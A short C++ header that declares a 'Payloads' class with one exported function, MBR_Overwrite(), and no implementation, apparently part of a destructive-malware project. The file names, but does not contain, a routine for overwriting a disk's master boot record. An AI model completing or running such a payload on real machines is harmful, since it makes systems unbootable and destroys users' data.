#pragma once

#include <stdio.h>
#include <conio.h>
#include <stdexcept>
#include <ctime>

namespace Payloads
{
	class Payloads
	{
	public:
		__declspec(dllexport) void MBR_Overwrite();
	private:
		
	};
}